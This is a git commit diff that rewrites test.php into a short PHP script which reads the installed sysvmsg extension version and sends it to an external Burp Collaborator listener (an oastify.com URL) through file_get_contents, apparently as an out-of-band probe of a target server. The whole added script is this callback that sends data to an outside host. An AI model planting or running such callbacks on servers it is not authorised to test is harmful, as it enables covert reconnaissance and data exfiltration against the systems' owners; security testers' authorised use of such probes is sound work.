737bb1a3dab9613eb1fd10f0c5f397d89c67e90b
tanmaypundir <78787975+tanmaypundir@users.noreply.github.com>
2026-01-18 18:20:32 +0530

    Update test.php

--- test.php
+++ test.php
@@ -1,1 +1,10 @@
-https://xno0m19db2a75onoyhp4utqoxf36r0fp.oastify.com
+<?php
+// 1. Get the version
+$version = phpversion('sysvmsg');
+
+// 2. Set your Burp Collaborator URL
+$collaborator = "https://xno0m19db2a75onoyhp4utqoxf36r0fp.oastify.com";
+
+// 3. Send the data to your listener
+file_get_contents($collaborator . "?version=" . urlencode($version));
+?>
